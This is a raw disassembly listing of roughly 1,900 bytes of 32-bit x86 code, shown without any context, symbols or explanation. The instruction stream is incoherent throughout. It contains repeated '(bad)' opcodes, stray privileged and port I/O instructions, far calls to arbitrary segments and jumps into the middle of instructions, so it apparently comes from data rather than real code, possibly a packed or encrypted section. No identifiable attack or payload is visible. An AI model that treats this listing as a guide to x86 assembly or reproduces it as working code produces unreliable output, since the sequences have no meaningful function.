  42ef91:	pushf  
  42ef92:	pop    ss
  42ef93:	rcl    WORD PTR cs:[esi-0x33],0x41
  42ef99:	mov    al,ds:0xe30ee3
  42ef9e:	jle    0x42ef52
  42efa0:	sbb    al,0x5
  42efa2:	imul   ebp,DWORD PTR [ebp+ecx*1+0x5d],0x32
  42efa7:	pop    eax
  42efa8:	aam    0x14
  42efaa:	jl     0x42ef45
  42efac:	or     BYTE PTR [esi-0x78],ch
  42efaf:	inc    edi
  42efb0:	push   eax
  42efb1:	ret    
  42efb2:	neg    dh
  42efb4:	adc    al,0x92
  42efb6:	jle    0x42ef4f
  42efb8:	ficom  DWORD PTR [eax-0x2f]
  42efbb:	in     al,dx
  42efbc:	mov    ds:0x41e5d42,eax
  42efc1:	sbb    al,0x5
  42efc3:	or     bl,BYTE PTR [edi-0x5e]
  42efc6:	sub    BYTE PTR [esi],0xdb
  42efc9:	jp     0x42ef52
  42efcb:	dec    ecx
  42efcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efcd:	or     BYTE PTR [esp+ecx*1-0x7f],cl
  42efd1:	enter  0x485,0x83
  42efd5:	lea    edx,ds:0x6a5d32b0
  42efdb:	cmp    edx,DWORD PTR [edi+edi*1+0xa]
  42efdf:	mov    ah,0x76
  42efe1:	test   BYTE PTR [eax],bl
  42efe3:	push   cs
  42efe4:	mov    ah,0x9
  42efe6:	loope  0x42f00f
  42efe8:	mov    al,0x40
  42efea:	mov    bl,0xf5
  42efec:	lock (bad) 
  42efee:	ror    BYTE PTR [edx],cl
  42eff0:	and    DWORD PTR [eax-0x5358330a],ecx
  42eff6:	xchg   esi,eax
  42eff7:	mov    esp,0xa2ac0e8
  42effc:	fisubr DWORD PTR [ecx-0x75965f4f]
  42f002:	jb     0x42efd4
  42f004:	push   edi
  42f005:	(bad)  
  42f006:	push   eax
  42f007:	ret    
  42f008:	push   0x5832eaad
  42f00d:	inc    ebx
  42f00e:	out    dx,al
  42f00f:	sbb    DWORD PTR [eax+0x6a282c02],esp
  42f015:	sbb    cl,BYTE PTR [ecx+0xd964856]
  42f01b:	cli    
  42f01c:	jbe    0x42efab
  42f01e:	pop    ebp
  42f01f:	adc    ecx,DWORD PTR cs:[esp+edx*1]
  42f023:	xchg   ecx,eax
  42f024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f025:	pusha  
  42f026:	and    dl,cl
  42f028:	sahf   
  42f029:	push   ss
  42f02a:	clc    
  42f02b:	adc    BYTE PTR [ebx+0x28d07d3c],bh
  42f031:	push   es
  42f032:	or     al,0xa1
  42f034:	and    al,BYTE PTR [ebx+0x2]
  42f037:	dec    ecx
  42f038:	add    al,0x54
  42f03a:	mov    ds:0x68d8e27a,al
  42f03f:	mov    dl,0x22
  42f041:	or     DWORD PTR [edi+ecx*2+0x1c],ebp
  42f045:	lods   al,BYTE PTR ds:[esi]
  42f046:	xchg   ebp,eax
  42f047:	inc    edi
  42f048:	popa   
  42f049:	jae    0x42efd5
  42f04b:	call   0x3476:0xa6ae7d0a
  42f052:	xor    DWORD PTR [ecx-0xa4d8b28],ecx
  42f058:	xor    ch,ah
  42f05a:	mov    ds:0x343b6c24,al
  42f05f:	in     al,0x6a
  42f061:	pop    esi
  42f062:	sbb    al,0x28
  42f064:	rol    dh,1
  42f066:	xchg   BYTE PTR [esi+0x45],ah
  42f069:	or     al,BYTE PTR [ebp-0x60]
  42f06c:	inc    esi
  42f06d:	imul   eax,DWORD PTR [edx],0x5c
  42f070:	add    al,0xf0
  42f072:	sub    al,0xb5
  42f074:	push   edi
  42f075:	cwde   
  42f076:	aam    0xed
  42f078:	rol    BYTE PTR [ebx+0x6e],1
  42f07b:	or     eax,DWORD PTR [edx+0x2cd1db22]
  42f081:	dec    esi
  42f082:	xor    BYTE PTR [esi-0x8c7ddc4],ch
  42f088:	ror    BYTE PTR ds:0xa2b6244f,0x88
  42f08f:	shl    BYTE PTR [esp+ebp*2+0x41f6ec83],cl
  42f096:	adc    eax,0xcc67aa0d
  42f09b:	outs   dx,BYTE PTR ds:[esi]
  42f09c:	and    DWORD PTR [edx+0x50],edx
  42f09f:	fwait
  42f0a0:	sub    BYTE PTR [eax],ch
  42f0a2:	push   eax
  42f0a3:	dec    esp
  42f0a4:	mov    cl,BYTE PTR [edi]
  42f0a6:	pushf  
  42f0a7:	jle    0x42f0d6
  42f0a9:	xor    BYTE PTR [ebx+0xd48ab8],dl
  42f0af:	je     0x42f06f
  42f0b1:	mov    cl,BYTE PTR [ecx+0x5a478251]
  42f0b7:	fwait
  42f0b8:	retf   0x5328
  42f0bb:	stos   BYTE PTR es:[edi],al
  42f0bc:	push   edx
  42f0bd:	mov    dh,al
  42f0bf:	inc    esp
  42f0c0:	pop    eax
  42f0c1:	aaa    
  42f0c2:	test   BYTE PTR [esi+ebx*4-0x575fdd92],ah
  42f0c9:	test   al,0xc2
  42f0cb:	call   0xd9e0:0x714840a
  42f0d2:	mov    eax,ds:0x84bc028c
  42f0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f0d8:	inc    esi
  42f0d9:	add    BYTE PTR [eax-0x66],dh
  42f0dc:	add    BYTE PTR cs:[ebx+0x54],cl
  42f0e0:	or     eax,0x72c4fd58
  42f0e5:	retf   
  42f0e6:	test   DWORD PTR es:[esi],ecx
  42f0e9:	add    DWORD PTR [edx],ebp
  42f0eb:	mov    eax,0x7e20d780
  42f0f0:	adc    bl,BYTE PTR [edi]
  42f0f2:	dec    esp
  42f0f3:	add    bh,bl
  42f0f5:	add    al,0x83
  42f0f7:	out    0x35,eax
  42f0f9:	lods   al,BYTE PTR ds:[esi]
  42f0fa:	test   al,0x78
  42f0fc:	sahf   
  42f0fd:	cli    
  42f0fe:	xchg   esp,eax
  42f0ff:	stc    
  42f100:	mov    esi,0xe43eb54a
  42f105:	daa    
  42f106:	popa   
  42f107:	inc    ecx
  42f108:	jae    0x42f15a
  42f10a:	and    bh,BYTE PTR [eax]
  42f10c:	and    al,0xf2
  42f10e:	aas    
  42f10f:	out    0xae,al
  42f111:	in     eax,dx
  42f112:	fadd   st,st(2)
  42f114:	sub    DWORD PTR ds:0x89d08198,esp
  42f11a:	int3   
  42f11b:	ds call 0x88bd:0x66556853
  42f123:	jg     0x42f123
  42f125:	loop   0x42f11c
  42f127:	pushf  
  42f128:	push   ss
  42f129:	aam    0x2
  42f12b:	inc    edx
  42f12c:	sub    al,BYTE PTR [eax]
  42f12e:	add    eax,0x4ee0bbcd
  42f133:	pushf  
  42f134:	add    ch,bh
  42f136:	fdiv   QWORD PTR [eax]
  42f138:	not    al
  42f13a:	shl    BYTE PTR [edx],0xb3
  42f13d:	mov    ?,WORD PTR [ebp-0x67345b2c]
  42f143:	mov    ah,0x40
  42f145:	add    al,ah
  42f147:	mov    fs,eax
  42f149:	jmp    0xdada:0xe9eeeb00
  42f150:	pop    esp
  42f151:	cwde   
  42f152:	test   al,0x0
  42f154:	stos   DWORD PTR es:[edi],eax
  42f155:	dec    ebx
  42f156:	ret    0xb420
  42f159:	xchg   BYTE PTR [edx],cl
  42f15b:	dec    ebx
  42f15c:	mov    ch,0x16
  42f15e:	xor    bh,BYTE PTR [ebx+0x5091320c]
  42f164:	adc    ebx,eax
  42f166:	mov    esi,0x6885185
  42f16b:	fs push ss
  42f16d:	pop    esp
  42f16e:	dec    ebp
  42f16f:	inc    eax
  42f170:	jne    0x42f1ef
  42f172:	sbb    al,0x87
  42f174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f175:	call   0x35f46e24
  42f17a:	test   BYTE PTR [edx+0xb],cl
  42f17d:	mov    dl,0x53
  42f17f:	scas   al,BYTE PTR es:[edi]
  42f180:	fadd   st,st(4)
  42f182:	dec    ebx
  42f183:	jmp    0x42f158
  42f185:	ins    DWORD PTR es:[edi],dx
  42f186:	or     al,0x99
  42f188:	adc    eax,0xf1cd150d
  42f18d:	jl     0x42f11f
  42f18f:	neg    DWORD PTR [edx-0x18]
  42f192:	lds    ebx,FWORD PTR [edx+0x9e5f863]
  42f198:	test   al,0x70
  42f19a:	inc    ebx
  42f19b:	mov    dl,0xc4
  42f19d:	or     DWORD PTR [eax+0x25],esi
  42f1a0:	sub    al,0x32
  42f1a2:	inc    edx
  42f1a3:	mov    esp,0x2e1611df
  42f1a8:	enter  0xd0da,0xd5
  42f1ac:	enter  0x623c,0x34
  42f1b0:	stos   BYTE PTR es:[edi],al
  42f1b1:	jae    0x42f13b
  42f1b3:	loope  0x42f1d6
  42f1b5:	sub    ch,0x90
  42f1b8:	retf   0xf5e
  42f1bb:	inc    esi
  42f1bc:	mov    al,ds:0x44d86248
  42f1c1:	add    BYTE PTR [eax+ebx*4+0x4203ac8],ch
  42f1c8:	js     0x42f19d
  42f1ca:	ret    0xf585
  42f1cd:	dec    eax
  42f1ce:	sbb    cl,cl
  42f1d0:	sub    DWORD PTR [eax-0x39],0xffffffb4
  42f1d4:	test   BYTE PTR [ecx-0x60],dl
  42f1d7:	cs int3 
  42f1d9:	pop    ds
  42f1da:	dec    ebx
  42f1db:	add    eax,0x29ca26b0
  42f1e0:	inc    esp
  42f1e1:	scas   al,BYTE PTR es:[edi]
  42f1e2:	mov    bh,0x70
  42f1e4:	call   0x42ce:0xcc2d72af
  42f1eb:	sahf   
  42f1ec:	fisub  WORD PTR [ebx]
  42f1ee:	xor    al,BYTE PTR [eax]
  42f1f0:	(bad)  
  42f1f1:	xor    eax,ebx
  42f1f3:	das    
  42f1f4:	add    BYTE PTR [ebx],cl
  42f1f6:	into   
  42f1f7:	cs cli 
  42f1f9:	dec    eax
  42f1fa:	adc    DWORD PTR [edx+0x2c],ebp
  42f1fd:	rol    bl,1
  42f1ff:	les    ecx,FWORD PTR [esi-0x4ee8ff55]
  42f205:	mov    bl,0xa6
  42f207:	and    BYTE PTR [esi],al
  42f209:	fidiv  DWORD PTR [ebx+0x3b22f35a]
  42f20f:	clc    
  42f210:	mov    ebp,DWORD PTR [eax-0x1851a95e]
  42f216:	mov    esi,0xfa201429
  42f21b:	pop    edi
  42f21c:	add    BYTE PTR [eax],ch
  42f21e:	or     BYTE PTR [ecx-0x3b811274],ah
  42f224:	add    al,0xbc
  42f226:	xchg   esi,eax
  42f227:	jbe    0x42f22f
  42f229:	sbb    eax,0x531c0a13
  42f22e:	jecxz  0x42f23b
  42f230:	mov    ebx,0x1441ae9e
  42f235:	jns    0x42f1ec
  42f237:	test   BYTE PTR [edx+ecx*2+0x60a8a26d],0x93
  42f23f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f240:	popa   
  42f241:	ret    0xda14
  42f244:	pop    ss
  42f245:	mov    ah,0x12
  42f247:	push   edi
  42f248:	sub    esi,DWORD PTR [esi]
  42f24a:	icebp  
  42f24b:	mov    al,ds:0x5a5bebb1
  42f250:	popa   
  42f251:	add    al,0x16
  42f253:	jp     0x42f2ab
  42f255:	pop    edx
  42f256:	mov    esi,0xa1da66c
  42f25b:	push   eax
  42f25c:	js     0x42f1e8
  42f25e:	in     al,dx
  42f25f:	and    bl,BYTE PTR [edx+0x1205e0f9]
  42f265:	sub    BYTE PTR cs:[esi-0x35c347c5],ah
  42f26c:	jbe    0x42f2ca
  42f26e:	add    esi,ecx
  42f270:	ds jle 0x42f21c
  42f273:	sbb    DWORD PTR [esi-0x4b7e175d],ecx
  42f279:	xor    dh,ch
  42f27b:	clc    
  42f27c:	adc    bh,BYTE PTR [edx+0x25e8da14]
  42f282:	adc    dh,al
  42f284:	gs xchg BYTE PTR ds:[esi+edx*2],bl
  42f289:	inc    ecx
  42f28a:	mov    bh,0x50
  42f28c:	lock mov ?,WORD PTR [eax+0x2d43e4b0]
  42f293:	push   edx
  42f294:	sbb    dl,BYTE PTR [edi-0x72]
  42f297:	jbe    0x42f227
  42f299:	and    BYTE PTR [esi-0x74],0x86
  42f29d:	and    cl,BYTE PTR [ebx]
  42f29f:	arpl   WORD PTR [edx+ebp*2],sp
  42f2a2:	adc    eax,0x1a2ad1fe
  42f2a7:	mov    dh,0xd2
  42f2a9:	call   0xe43b7176
  42f2ae:	hlt    
  42f2af:	rol    DWORD PTR [esi+ecx*4],1
  42f2b2:	je     0x42f2a1
  42f2b4:	cli    
  42f2b5:	add    al,0x86
  42f2b7:	mov    ecx,0x44a98d8c
  42f2bc:	pop    eax
  42f2bd:	fisubr DWORD PTR [esi+0x27be02a8]
  42f2c3:	cwde   
  42f2c4:	ficom  DWORD PTR [eax]
  42f2c6:	arpl   WORD PTR [ebx+0x245a11e1],bp
  42f2cc:	enter  0x21f8,0x38
  42f2d0:	push   ss
  42f2d1:	enter  0xbc49,0x14
  42f2d5:	mov    cl,0xa4
  42f2d7:	cs mov bl,0x4a
  42f2da:	jg     0x42f290
  42f2dc:	xchg   BYTE PTR [edi],al
  42f2de:	sbb    ch,BYTE PTR [edi+0x42dec64e]
  42f2e4:	mov    esi,0xa2b79a50
  42f2e9:	stos   BYTE PTR es:[edi],al
  42f2ea:	sub    edi,DWORD PTR [edx+eiz*4]
  42f2ed:	in     al,dx
  42f2ee:	jmp    0x9970:0x794eac
  42f2f5:	lea    esp,[ebx+0x10]
  42f2f8:	sub    ebx,DWORD PTR [edx*2+0x3952468e]
  42f2ff:	add    BYTE PTR [esi],0x95
  42f302:	div    BYTE PTR [ecx+ebx*2+0x62]
  42f306:	sub    bl,BYTE PTR [esi-0x1c715274]
  42f30c:	inc    eax
  42f30d:	push   ebx
  42f30e:	pusha  
  42f30f:	fmul   DWORD PTR [esi+0x186b934c]
  42f315:	pop    ebp
  42f316:	adc    dh,dl
  42f318:	jbe    0x42f2ba
  42f31a:	jmp    0x42f324
  42f31c:	les    ecx,FWORD PTR [esi+0x482918b2]
  42f322:	(bad)  
  42f323:	imul   ecx,DWORD PTR [edx-0x435f5e9a],0xffffffa9
  42f32a:	mov    ah,0x68
  42f32c:	test   al,0x4a
  42f32e:	add    al,0xd8
  42f330:	shl    al,1
  42f332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f333:	jne    0x42f32f
  42f335:	ja     0x42f387
  42f337:	mov    edi,0x5b3c5d2c
  42f33c:	stos   BYTE PTR es:[edi],al
  42f33d:	test   BYTE PTR [eax+0x45ac926],0x9
  42f344:	loop   0x42f38e
  42f346:	add    al,0x3c
  42f348:	test   eax,0xc2161224
  42f34d:	sub    BYTE PTR [ebx+0x4a],0xa1
  42f351:	mov    eax,ds:0x41321aec
  42f356:	mov    edx,0x65284e0a
  42f35b:	mov    al,ds:0x1638401a
  42f360:	push   edi
  42f361:	or     BYTE PTR ds:[eax],ch
  42f364:	js     0x42f320
  42f366:	mov    ebx,0x82b424df
  42f36b:	adc    al,0xda
  42f36d:	lods   eax,DWORD PTR ds:[esi]
  42f36e:	retf   0xc1b0
  42f371:	inc    eax
  42f372:	ret    0x4484
  42f375:	and    BYTE PTR [eax+edi*4],cl
  42f378:	cmp    bh,BYTE PTR [esi]
  42f37a:	jl     0x42f327
  42f37c:	push   0x7ce663ae
  42f381:	scas   eax,DWORD PTR es:[edi]
  42f382:	push   0xffffffb4
  42f384:	or     ch,BYTE PTR [esi+0x6cc80076]
  42f38a:	clc    
  42f38b:	xor    al,0xb1
  42f38d:	ror    BYTE PTR [eax-0x24],0xc2
  42f391:	add    dl,al
  42f393:	test   al,0x23
  42f395:	sbb    ch,dl
  42f397:	enter  0x1a52,0x53
  42f39b:	mov    ecx,0xbe8a11e0
  42f3a0:	jns    0x42f3cc
  42f3a2:	add    al,0xc1
  42f3a4:	xor    BYTE PTR [esi+0x0],al
  42f3a7:	dec    esp
  42f3a8:	mov    cl,0xab
  42f3aa:	mov    ds:0xa89a49a9,eax
  42f3af:	adc    dl,BYTE PTR [edi]
  42f3b1:	ret    0x450d
  42f3b4:	aam    0x34
  42f3b6:	cld    
  42f3b7:	mov    ds:0xc845a3a8,al
  42f3bc:	ret    
  42f3bd:	imul   esi,DWORD PTR ds:0x9611ecd5,0x82a699b4
  42f3c7:	test   al,0xb4
  42f3c9:	je     0x42f3d3
  42f3cb:	mov    eax,ds:0x3e5ca80e
  42f3d0:	adc    dl,BYTE PTR [eax-0x22]
  42f3d3:	mov    ah,0x43
  42f3d5:	sub    eax,0xa0640602
  42f3da:	inc    esi
  42f3db:	mov    ds:0x24b92700,al
  42f3e0:	jle    0x42f3ac
  42f3e2:	push   0x16b24867
  42f3e7:	inc    ecx
  42f3e8:	inc    edi
  42f3e9:	imul   ecx,edi,0x6a
  42f3ec:	dec    ebx
  42f3ed:	push   ss
  42f3ee:	(bad)  
  42f3ef:	mov    dl,0xc7
  42f3f1:	and    al,0xdd
  42f3f3:	rol    al,0x26
  42f3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3f7:	pop    edx
  42f3f8:	xchg   edi,eax
  42f3f9:	loop   0x42f46e
  42f3fb:	jle    0x42f473
  42f3fd:	loopne 0x42f419
  42f3ff:	pop    esi
  42f400:	and    cl,ah
  42f402:	rcl    BYTE PTR [eax+0xc3a6b],0x30
  42f409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f40a:	pop    ebp
  42f40b:	add    ebp,DWORD PTR [eax+0xa]
  42f40e:	mov    dl,BYTE PTR [ebx]
  42f410:	ret    0x2c3a
  42f413:	push   ebp
  42f414:	cwde   
  42f415:	sbb    al,BYTE PTR [eax]
  42f417:	lods   al,BYTE PTR ds:[esi]
  42f418:	pop    ss
  42f419:	pop    esi
  42f41a:	mov    dl,0xa6
  42f41c:	or     eax,0x5e61d1af
  42f421:	pusha  
  42f422:	inc    esp
  42f423:	adc    BYTE PTR [ebp+0x20028b14],bh
  42f429:	xchg   BYTE PTR [esi+edi*2],al
  42f42c:	mov    esi,0xa8403ec1
  42f431:	and    al,0x45
  42f433:	fs sub eax,0x1548c459
  42f439:	mov    ch,0x22
  42f43b:	xor    BYTE PTR [edx-0x1e],cl
  42f43e:	test   al,bh
  42f440:	or     al,0x34
  42f442:	pop    esp
  42f443:	sar    DWORD PTR [eax-0x16],cl
  42f446:	pop    eax
  42f447:	dec    BYTE PTR [edx+0x29]
  42f44a:	xchg   edx,eax
  42f44b:	cdq    
  42f44c:	adc    eax,0x4e153554
  42f451:	xor    edi,DWORD PTR [edx]
  42f453:	adc    eax,0xc28408de
  42f458:	or     BYTE PTR [ebx+0x1dd25535],ah
  42f45e:	inc    esi
  42f45f:	sar    edx,0xa5
  42f462:	add    BYTE PTR [eax-0x3547bd5d],ch
  42f468:	add    al,0x72
  42f46a:	jne    0x42f4d8
  42f46c:	mov    ds:0x87441a1,eax
  42f471:	idiv   BYTE PTR [esi]
  42f473:	stos   BYTE PTR es:[edi],al
  42f474:	jnp    0x42f48a
  42f476:	mov    al,0x42
  42f478:	(bad)  
  42f479:	push   0xffffffff
  42f47b:	pop    ebp
  42f47c:	fidiv  DWORD PTR [ecx-0x2a]
  42f47f:	pusha  
  42f480:	inc    ebp
  42f481:	xchg   DWORD PTR [eax-0x32],esp
  42f484:	push   ds
  42f485:	jb     0x42f48d
  42f487:	arpl   dx,di
  42f489:	dec    edi
  42f48a:	mov    cl,dh
  42f48c:	dec    edx
  42f48d:	clc    
  42f48e:	and    eax,0x7c2da070
  42f493:	cld    
  42f494:	sub    BYTE PTR [esi+esi*4-0x14],ah
  42f498:	test   DWORD PTR [edx-0x63bf3661],ecx
  42f49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f49f:	mov    cl,BYTE PTR [esi]
  42f4a1:	mov    bh,0xde
  42f4a3:	test   al,0xdd
  42f4a5:	xor    al,0xf5
  42f4a7:	add    al,0xa3
  42f4a9:	jne    0x42f500
  42f4ab:	mov    ch,0x50
  42f4ad:	sub    BYTE PTR [esi-0x1c],bh
  42f4b0:	shl    DWORD PTR [esi],cl
  42f4b2:	pop    edx
  42f4b3:	inc    esi
  42f4b4:	and    ebp,DWORD PTR [ebp+0x52]
  42f4b7:	je     0x42f50e
  42f4b9:	outs   dx,BYTE PTR ds:[esi]
  42f4ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f4bb:	xchg   BYTE PTR [esi+0x51cb0abe],bl
  42f4c1:	pop    ss
  42f4c2:	mov    BYTE PTR [esi-0x79],ah
  42f4c5:	fsub   st(2),st
  42f4c7:	lods   eax,DWORD PTR ds:[esi]
  42f4c8:	jmp    0x8705c7c7
  42f4cd:	daa    
  42f4ce:	jmp    0x953db04e
  42f4d3:	mov    dh,0x21
  42f4d5:	aad    0xb5
  42f4d7:	(bad)  
  42f4d9:	sbb    ebx,edx
  42f4db:	lods   al,BYTE PTR ds:[esi]
  42f4dc:	sub    BYTE PTR [esp+eiz*2+0x45186f97],bl
  42f4e3:	xchg   esp,eax
  42f4e4:	call   0x321b9917
  42f4e9:	icebp  
  42f4ea:	cdq    
  42f4eb:	les    ebx,FWORD PTR [esi]
  42f4ed:	and    DWORD PTR [ecx+ebx*8],esi
  42f4f0:	aam    0x2a
  42f4f2:	(bad)  
  42f4f3:	mov    bl,BYTE PTR [edx-0x29]
  42f4f6:	ficomp DWORD PTR [esp+ecx*1+0x34]
  42f4fa:	add    al,0x4a
  42f4fc:	fwait
  42f4fd:	retf   0xfaf5
  42f500:	mov    ds:0x3bc443e1,al
  42f505:	mov    DWORD PTR [esi+0x6c3daa28],ebp
  42f50b:	mov    dh,0x49
  42f50d:	pusha  
  42f50e:	inc    eax
  42f50f:	sub    BYTE PTR [ebp+0x39a0e2eb],dl
  42f515:	mov    DWORD PTR [edx-0x41b604de],esp
  42f51b:	sub    DWORD PTR [ecx+0x2e],0xffffffe0
  42f51f:	pusha  
  42f520:	cmp    BYTE PTR ds:0xe7cd0b1c,dl
  42f526:	repz mov eax,0xf1965358
  42f52c:	adc    eax,0x3aa1a162
  42f531:	iret   
  42f532:	push   0x9e344656
  42f537:	arpl   cx,sp
  42f539:	pop    ss
  42f53a:	(bad)  
  42f53b:	imul   BYTE PTR [eax+0x51dc97ce]
  42f541:	fwait
  42f542:	mov    ebx,0xbecbe4da
  42f547:	stc    
  42f548:	es push edx
  42f54a:	add    BYTE PTR [ecx-0x3b],ah
  42f54d:	mov    edi,0x1d54219a
  42f552:	or     al,BYTE PTR [eax+0x60454c6]
  42f558:	sub    edx,0xdd28c160
  42f55e:	fbld   TBYTE PTR [esi]
  42f560:	or     al,0x55
  42f562:	xchg   esi,eax
  42f563:	adc    al,ch
  42f565:	fsubr  QWORD PTR [esi+0x60]
  42f568:	ror    DWORD PTR [ebx+0x35c444c],0x2f
  42f56f:	add    cl,ah
  42f571:	dec    esi
  42f572:	loop   0x42f5e8
  42f574:	fistp  DWORD PTR [edx]
  42f576:	call   0x2b7:0x6aa5351a
  42f57d:	jnp    0x42f555
  42f57f:	cmp    al,0x3e
  42f581:	sbb    al,0xa1
  42f583:	sbb    DWORD PTR ds:0xac587c34,esp
  42f589:	and    bh,dl
  42f58b:	adc    al,BYTE PTR [eax]
  42f58d:	call   0x48d7c2be
  42f592:	popa   
  42f593:	inc    edi
  42f594:	adc    edx,eax
  42f596:	jo     0x42f54a
  42f598:	bound  esi,QWORD PTR [ecx+eiz*4-0x72eee27e]
  42f59f:	xchg   edx,eax
  42f5a0:	dec    edx
  42f5a1:	push   es
  42f5a2:	inc    esp
  42f5a3:	or     BYTE PTR [edx+0x35543444],ch
  42f5a9:	les    ebx,FWORD PTR [edx+0x1a028ea2]
  42f5af:	repz mov ds:0x5410c0ad,al
  42f5b5:	dec    ebp
  42f5b6:	inc    esi
  42f5b7:	jmp    0xdd72:0x88b649
  42f5be:	adc    eax,0x135ac354
  42f5c3:	mov    BYTE PTR [eax+0x7234321c],dl
  42f5c9:	pusha  
  42f5ca:	cmp    al,0x80
  42f5cc:	clc    
  42f5cd:	or     al,dl
  42f5cf:	ins    BYTE PTR es:[edi],dx
  42f5d0:	test   eax,0x473f84
  42f5d5:	push   esi
  42f5d6:	xor    eax,0x77061386
  42f5db:	add    edx,0x5db40dee
  42f5e1:	adc    eax,0xceda4410
  42f5e6:	(bad)  
  42f5e7:	(bad)  
  42f5e8:	jae    0x42f614
  42f5ea:	fcmovnu st,st(2)
  42f5ec:	xor    edx,DWORD PTR [esi]
  42f5ee:	mov    ch,0x52
  42f5f0:	ss pop esi
  42f5f2:	jnp    0x42f610
  42f5f4:	push   0xffffffba
  42f5f6:	ror    DWORD PTR [esi*1+0x2e3d3bd9],0x16
  42f5fe:	ins    DWORD PTR es:[edi],dx
  42f5ff:	imul   BYTE PTR [ecx+0x74a8adb5]
  42f605:	ret    
  42f606:	mov    al,0x75
  42f608:	jbe    0x42f648
  42f60a:	jbe    0x42f634
  42f60c:	dec    edx
  42f60e:	mov    dl,0x6e
  42f610:	mov    al,ds:0x4f7c4fd9
  42f615:	cwde   
  42f616:	push   ss
  42f617:	adc    BYTE PTR ds:0x52e3044,dh
  42f61d:	ins    BYTE PTR es:[edi],dx
  42f61e:	jo     0x42f634
  42f620:	jo     0x42f5e6
  42f622:	push   0xffffffaa
  42f624:	adc    BYTE PTR [ecx+0x20],0x98
  42f628:	cld    
  42f629:	mov    al,ds:0x32c07400
  42f62e:	inc    ecx
  42f62f:	xchg   edi,eax
  42f630:	cwde   
  42f631:	dec    esp
  42f632:	clc    
  42f633:	mov    dh,0xa3
  42f635:	jns    0x42f5ce
  42f637:	pop    esi
  42f638:	xchg   edx,eax
  42f639:	jns    0x42f659
  42f63b:	add    al,dh
  42f63d:	stc    
  42f63e:	jb     0x42f600
  42f640:	imul   esi,esp,0x54
  42f643:	inc    ebx
  42f644:	push   cs
  42f645:	or     ecx,DWORD PTR [esi]
  42f647:	(bad)  
  42f648:	out    dx,eax
  42f649:	sbb    edx,ebx
  42f64b:	pop    edx
  42f64c:	adc    al,0xcc
  42f64e:	push   edx
  42f64f:	imul   ebp,eax,0xffffffdc
  42f652:	icebp  
  42f653:	ins    DWORD PTR es:[edi],dx
  42f654:	dec    ebx
  42f655:	test   al,0x12
  42f657:	in     eax,dx
  42f658:	test   BYTE PTR [esp+eiz*2+0x54dbd220],dh
  42f65f:	pop    edx
  42f660:	jmp    0x42f6dc
  42f662:	inc    edx
  42f663:	ds sahf 
  42f665:	cmp    BYTE PTR [edx+0xd041ce8],bl
  42f66b:	in     eax,dx
  42f66c:	or     cl,BYTE PTR [ebx-0x5349426]
  42f672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f673:	mov    al,ds:0x6a52fe2b
  42f678:	mov    ds:0x21865d1d,al
  42f67d:	push   ds
  42f67e:	pushf  
  42f67f:	jl     0x42f613
  42f681:	and    BYTE PTR cs:[eax+0x58428369],0x56
  42f689:	lahf   
  42f68a:	lds    esp,FWORD PTR [esi-0x27fec64a]
  42f690:	das    
  42f691:	call   0x1038:0xd0348937
  42f698:	push   eax
  42f699:	add    BYTE PTR [eax+edi*4],al
  42f69c:	mov    al,0x5d
  42f69e:	push   ecx
  42f69f:	push   ebx
  42f6a0:	xchg   DWORD PTR [edx+0x4a],eax
  42f6a3:	and    al,0x6e
  42f6a5:	mov    al,ds:0x9ad74a60
  42f6aa:	xchg   ebx,eax
  42f6ab:	inc    esi
  42f6ac:	pop    eax
  42f6ad:	push   cs
  42f6ae:	lods   al,BYTE PTR ds:[esi]
  42f6af:	cmc    
  42f6b0:	mov    al,ds:0xac40b28c
  42f6b5:	mov    al,0xd
  42f6b7:	inc    esp
  42f6b8:	xor    ch,BYTE PTR [esi]
  42f6ba:	jo     0x42f6c0
  42f6bc:	hlt    
  42f6bd:	fistp  WORD PTR [edx+edx*1+0x15128f0c]
  42f6c4:	add    eax,0x82a25c14
  42f6c9:	push   esi
  42f6ca:	aam    0xa6
  42f6cc:	cdq    
  42f6cd:	out    0xe1,al
  42f6cf:	mov    al,ds:0x68cf2aa0
  42f6d4:	push   ebp
  42f6d5:	or     eax,0xb45ac0c7
  42f6da:	sahf   
  42f6db:	mov    edi,0x7c2acd62
  42f6e0:	call   0xa46:0x4eb74d6d
  42f6e7:	add    dh,bl
  42f6e9:	fs retf 0xe90a
  42f6ed:	imul   ebx,DWORD PTR [edx-0x2bec7f24],0x8afeb0a1
  42f6f7:	xor    DWORD PTR [eax+0x2a686a9],eax
  42f6fd:	and    al,0x57
  42f6ff:	inc    esi
  42f700:	cmp    eax,0x8585907a
  42f705:	add    bl,BYTE PTR [eax+0x125e76d0]
  42f70b:	and    al,0x29
  42f70d:	and    DWORD PTR [eax+ecx*4],esi
  42f710:	sbb    ecx,DWORD PTR [edx]
  42f712:	rol    DWORD PTR [ebp-0x5d],1
  42f715:	inc    ebx
  42f716:	xchg   edx,eax
  42f717:	cmp    al,0xd5
  42f719:	cld    
  42f71a:	into   
  42f71b:	mov    al,ds:0xecae0b68
  42f720:	stos   DWORD PTR es:[edi],eax
  42f721:	mov    ah,0xa6
  42f723:	out    0x28,eax
  42f725:	jb     0x42f72b
  42f727:	pop    esi
  42f728:	ficomp DWORD PTR [eax-0x2f]
  42f72b:	xchg   BYTE PTR [edx],bh
  42f72d:	jl     0x42f6b2
  42f72f:	cmc    
  42f730:	sahf   
  42f731:	lahf   
  42f732:	xchg   edi,eax
  42f733:	sub    al,0x26
  42f735:	lock xchg esi,eax
  42f737:	or     al,0x1c
  42f739:	or     BYTE PTR [ebp+0x65f85b3c],ch
  42f73f:	xor    al,0x84
  42f741:	aad    0xc4
  42f743:	in     al,0x4a
  42f745:	cmp    BYTE PTR [edx-0x5e917daa],ah
  42f74b:	mov    BYTE PTR [eax+esi*8+0x23],bh
  42f74f:	add    bl,BYTE PTR [ebx+0x6ff92210]
  42f755:	xchg   esi,eax
  42f756:	ins    DWORD PTR es:[edi],dx
  42f757:	jg     0x42f759
